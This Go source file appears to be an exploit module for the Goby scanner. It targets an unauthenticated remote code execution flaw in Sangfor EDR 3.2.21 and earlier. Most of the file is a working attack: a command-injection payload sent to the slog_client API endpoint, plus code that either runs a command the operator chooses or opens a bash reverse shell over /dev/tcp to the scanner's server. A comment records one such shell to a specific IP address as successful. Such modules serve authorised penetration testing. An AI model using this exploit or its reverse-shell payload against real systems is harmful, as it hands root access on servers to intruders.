package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"github.com/jinzhu/copier"
	"log"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Sangfor EDR 3.2.21 Remote Code Execution Vulnerability",
    "Description": "Sangfor Endpoint Detection and Response (EDR) is a security solution provided by Sangfor, consisting of lightweight endpoint security software (Agent) and a management platform (MGR). An unauthorized RCE vulnerability exists in version 3.2.21 and earlier, allowing attackers to gain root access to the server.",
    "Product": "Sangfor Endpoint Detection and Response Platform",
    "Homepage": "https://www.sangfor.com.cn/product/net-safe-mobile-security-edr.html",
    "Author": "gobysec@gmail.com",
    "FofaQuery": "title=\"SANGFOR终端检测响应平台\"",
    "Level": "3",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "9.8",
    "VulType": [
        "Command Execution"
    ],
    "Impact": "<p>The Sangfor Endpoint Detection and Response (EDR) platform has an unauthorized RCE vulnerability in version 3.2.21 and earlier, which allows attackers to gain root access to the server.</p>",
    "Recommendation": "<p>1. The vendor has not yet released a patch for this vulnerability. Please monitor the product's official website for updates: <a href=\"https://www.sangfor.com.cn/product/net-safe-mobile-security-edr.html\">https://www.sangfor.com.cn/product/net-safe-mobile-security-edr.html</a></p><p>2. Restrict public access to the system.</p><p>3. Implement basic authentication or whitelist access mechanisms for the web system.</p>",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "DisclosureDate": "2020-09-11",
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,goby_shell_linux"
        },
        {
            "name": "cmd",
            "type": "input",
            "show": "AttackType=cmd",
            "value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "set_variable": [
                    "cmd|define|text|echo jfzsjfoijnqnjvgkdxnboiqnbgvmdi"
                ],
                "data": "{\"params\":\"w=123\\\"'111'\\\"|{{{cmd}}}\"}",
                "data_type": "text",
                "follow_redirect": true,
                "method": "POST",
                "uri": "/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "jfzsjfoijnqnjvgkdxnboiqnbgvmdi",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "CVEIDs": [],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": [
            "SANGFOR-EDR"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "GobyQuery": "title=\"SANGFOR终端检测响应平台\"",
    "Translation": {
        "CN": {
            "Name": "深信服 EDR 3.2.21任意代码执行漏洞",
            "Product": "深信服终端检测响应平台",
            "Description": "深信服终端检测响应平台（EDR）是深信服公司提供的一套终端安全解决方案，方案由轻量级的端点安全软件（Agent）和管理平台（MGR）共同组成。该系统在3.2.21版本及之前存在未授权的RCE漏洞，攻击者可以凭借这个漏洞获取服务器root权限",
            "Recommendation": "<p>1.目前厂商尚未发布该漏洞补丁，可多关注该产品官网关于此漏洞的信息:<a href=\"https://www.sangfor.com.cn/product/net-safe-mobile-security-edr.html\" rel=\"nofollow\">https://www.sangfor.com.cn/product/net-safe-mobile-security-edr.html</a></p><p>2.禁止公网访问该系统</p><p>3.对该web系统设置basic认证或者白名单访问机制</p>",
            "Impact": "<p>深信服终端检测响应平台（EDR）是深信服公司提供的一套终端安全解决方案，方案由轻量级的端点安全软件（Agent）和管理平台（MGR）共同组成。该系统在3.2.21版本及之前存在未授权的RCE漏洞，攻击者可以凭借这个漏洞获取服务器root权限</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Sangfor EDR 3.2.21 Remote Code Execution Vulnerability",
            "Product": "Sangfor Endpoint Detection and Response Platform",
            "Description": "Sangfor Endpoint Detection and Response (EDR) is a security solution provided by Sangfor, consisting of lightweight endpoint security software (Agent) and a management platform (MGR). An unauthorized RCE vulnerability exists in version 3.2.21 and earlier, allowing attackers to gain root access to the server.",
            "Recommendation": "<p>1. The vendor has not yet released a patch for this vulnerability. Please monitor the product's official website for updates: <a href=\"https://www.sangfor.com.cn/product/net-safe-mobile-security-edr.html\" rel=\"nofollow\">https://www.sangfor.com.cn/product/net-safe-mobile-security-edr.html</a></p><p>2. Restrict public access to the system.</p><p>3. Implement basic authentication or whitelist access mechanisms for the web system.</p>",
            "Impact": "<p>The Sangfor Endpoint Detection and Response (EDR) platform has an unauthorized RCE vulnerability in version 3.2.21 and earlier, which allows attackers to gain root access to the server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var newExp jsonvul.JsonVul
			copier.Copy(&newExp, &expResult.Exploit)
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {

				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", godclient.GetGodServerHost(), rp)
					//cmd="ls"
					//cmd="bash -i >& /dev/tcp/45.142.166.49/23629 0>&1"  成功
					newExp.ScanSteps.Steps[0].Request.SetVariable[0] = `cmd|define|text|`+cmd+";"+"echo be4ea51d962be8308a0099ae1eb3ec63"
					newExp.Vulnerable(expResult.HostInfo, ss)
					//if strings.Contains(newExp.ScanSteps.LastHttpTrans().Utf8Html, "be4ea51d962be8308a0099ae1eb3ec63"){
						//expResult.Success = true
						//expResult.Output=newExp.ScanSteps.LastHttpTrans().Utf8Html
					//}
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						expResult.Output = webConsleID
						expResult.Success = true
					case <-time.After(time.Second * 10):

					}
				}
			}else if ss.Params["AttackType"].(string) == "cmd" {
				cmd :=ss.Params["cmd"].(string)
				newExp.ScanSteps.Steps[0].Request.SetVariable[0] = `cmd|define|text|`+cmd+";"+"echo be4ea51d962be8308a0099ae1eb3ec63"
				newExp.Vulnerable(expResult.HostInfo, ss)
				if strings.Contains(ss.LastHttpTrans().Utf8Html, "be4ea51d962be8308a0099ae1eb3ec63"){

					expResult.Success = true
					expResult.Output = ss.LastHttpTrans().Utf8Html
				}

			}
			return expResult

		},
	))
}
